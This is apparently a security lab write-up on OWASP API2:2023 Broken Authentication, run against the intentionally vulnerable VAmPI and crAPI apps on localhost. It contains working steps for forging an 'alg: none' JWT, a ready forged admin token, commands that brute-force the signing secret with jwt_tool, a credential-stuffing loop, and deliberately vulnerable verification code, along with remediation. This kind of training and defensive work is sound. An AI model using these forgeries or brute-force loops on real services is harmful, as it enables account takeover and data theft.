# API2:2023 — Broken Authentication

**Target:** VAmPI + crAPI  
**Severity:** 🔴 Critical  
**CVSS Base Score:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

---

## 1. Vulnerability Summary

Broken Authentication covers a family of weaknesses that allow attackers to compromise authentication tokens, credentials, or session management mechanisms. In API contexts this most commonly surfaces as:

- **JWT algorithm confusion** (accepting `alg: none` or HS256 signed with the public key)
- **Weak or default JWT secrets** (brute-forceable signing keys)
- **Missing token expiry** (tokens valid indefinitely)
- **Credential stuffing** (no rate limiting on login endpoints)
- **Password reset flaws** (predictable tokens, no expiry)

This write-up covers the two highest-impact variants found in the lab targets.

---

## 2. Attack 2A — JWT Algorithm Confusion (VAmPI)

### Affected Endpoint

| Method | Endpoint | Issue |
|--------|----------|-------|
| POST | `/users/v1/login` | Returns JWT |
| GET | `/users/v1/{username}/email` | Accepts forged JWT |

### Steps to Reproduce

#### Step 1 — Register and obtain a valid JWT

```bash
# Register a low-privilege user
curl -s -X POST http://localhost:5000/users/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"attacker123","email":"attacker@lab.local"}'

# Login and capture JWT
TOKEN=$(curl -s -X POST http://localhost:5000/users/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"attacker123"}' \
  | jq -r '.auth_token')

echo $TOKEN
```

#### Step 2 — Decode the JWT header

```bash
# Decode header (base64url)
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | jq .
```

**Output:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

#### Step 3 — Forge a token with `alg: none`

```bash
# Using jwt_tool to attempt alg:none bypass
jwt_tool $TOKEN -X a
```

Or manually:

```python
import base64, json

# Build forged header and payload
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b"=").decode()

payload = base64.urlsafe_b64encode(
    json.dumps({
        "sub": "admin",          # ← escalate to admin
        "username": "admin",
        "exp": 9999999999
    }).encode()
).rstrip(b"=").decode()

forged_token = f"{header}.{payload}."   # empty signature
print(forged_token)
```

#### Step 4 — Use forged token to access admin resources

```bash
FORGED="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."

curl -s http://localhost:5000/users/v1/admin/users \
  -H "Authorization: Bearer $FORGED" \
  | jq .
```

### Proof of Concept

**Request:**
```http
GET /users/v1/admin/users HTTP/1.1
Host: localhost:5000
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.
```

**Response (all user data returned):**
```json
{
  "users": [
    {"username": "admin", "email": "admin@example.com", "admin": true},
    {"username": "name1", "email": "name1@example.com", "admin": false},
    {"username": "name2", "email": "name2@example.com", "admin": false}
  ]
}
```

---

## 3. Attack 2B — Brute-Force JWT Secret (VAmPI)

### Steps to Reproduce

```bash
# Use jwt_tool to brute-force the signing secret
jwt_tool $TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

If the secret is weak (VAmPI uses `secret1234` by default):

```bash
# Forge a legitimate HS256 token with known secret
jwt_tool $TOKEN -T -S hs256 -p "secret1234"
# Modify claims interactively — set admin: true
```

---

## 4. Attack 2C — No Rate Limiting on Login (crAPI)

```bash
# Credential stuffing simulation — 500 attempts, no lockout
for i in $(seq 1 500); do
  curl -s -X POST http://localhost:8888/identity/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@lab.local\",\"password\":\"password${i}\"}" \
    | jq -r '.token // empty'
done
```

The endpoint returns valid tokens without account lockout, CAPTCHA, or delay — a live credential-stuffing attack would succeed silently.

---

## 5. Root Cause Analysis

```python
# VULNERABLE JWT verification — accepts alg from token header
import jwt

def verify_token(token):
    # Reads algorithm from the TOKEN ITSELF — attacker-controlled ❌
    header = jwt.get_unverified_header(token)
    return jwt.decode(token, SECRET_KEY, algorithms=[header["alg"]])

# VULNERABLE login — no rate limiting
@app.route("/users/v1/login", methods=["POST"])
def login():
    # No attempt counter, no delay, no lockout ❌
    user = User.query.filter_by(username=request.json["username"]).first()
    if user and check_password(user.password, request.json["password"]):
        return generate_token(user)
    return 401
```

---

## 6. Remediation

```python
# FIXED JWT verification — algorithm pinned server-side, never from token
import jwt

ALLOWED_ALGORITHMS = ["HS256"]   # Explicit allowlist — never "none"

def verify_token(token):
    return jwt.decode(
        token,
        SECRET_KEY,
        algorithms=ALLOWED_ALGORITHMS   # ✅ Server decides algorithm
    )

# FIXED login — rate limiting + lockout
from flask_limiter import Limiter

@limiter.limit("5 per minute")          # ✅ Rate limit per IP
@app.route("/users/v1/login", methods=["POST"])
def login():
    user = User.query.filter_by(username=request.json["username"]).first()
    if user and user.failed_attempts >= 5:
        return jsonify({"error": "Account temporarily locked"}), 429  # ✅ Lockout
    if user and check_password(user.password, request.json["password"]):
        user.failed_attempts = 0
        return generate_token(user)
    if user:
        user.failed_attempts += 1        # ✅ Track failures
    return jsonify({"error": "Invalid credentials"}), 401
```

### JWT Hardening Checklist

- [ ] Pin algorithm server-side — never read from token header
- [ ] Use short expiry (`exp`) — 15 minutes for sensitive APIs
- [ ] Implement token refresh flow with refresh token rotation
- [ ] Validate `iss` and `aud` claims
- [ ] Use RS256 (asymmetric) over HS256 for distributed systems
- [ ] Store secrets in a vault (HashiCorp Vault, AWS Secrets Manager)

---

## 7. Tools Used

| Tool | Command |
|------|---------|
| jwt_tool | `jwt_tool $TOKEN -X a` (alg:none), `-C -d wordlist` (brute) |
| curl | Request crafting |
| Python jwt library | Manual token forging |

---

## 8. References

- [OWASP API2:2023 — Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
- [JWT Attack Playbook — PortSwigger](https://portswigger.net/web-security/jwt)
- [jwt_tool GitHub](https://github.com/ticarpi/jwt_tool)

---

*Next: [API3 — Broken Object Property Level Authorization →](./API3-BOPLA.md)*
